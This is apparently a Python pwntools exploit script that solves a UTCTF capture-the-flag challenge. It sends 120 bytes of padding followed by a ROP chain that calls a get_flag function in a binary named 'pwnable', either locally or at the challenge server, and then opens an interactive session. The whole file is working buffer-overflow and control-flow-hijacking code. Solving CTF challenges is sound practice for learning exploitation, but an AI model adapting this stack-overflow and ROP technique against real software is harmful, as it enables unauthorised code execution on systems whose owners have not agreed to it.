from pwn import *
import sys


context.clear(arch='amd64')

argv = sys.argv
REMOTE = False
DEBUG = False
binary_path = './pwnable'

if len(argv) > 1:
	if argv[1] == 'remote':
		REMOTE = True
	if argv[1] == 'debug':
		DEBUG = True

if REMOTE:
	sh = remote('binary.utctf.live', 9002)
else:
	sh = process(binary_path)
	if DEBUG:
		gdb.attach(sh, '''
			b* main
			''')

e = ELF(binary_path)

overflow_offset =  120

rop = ROP(e)
rop.get_flag(0xdeadbeef)

log.info('get_flag: {}'.format(hex(e.symbols['get_flag'])))

payload = 'A' * overflow_offset + str(rop)

log.info('payload: {}'.format(payload))

sh.sendlineafter('I really like strings! Please give me a good one!', payload)

print sh.interactive()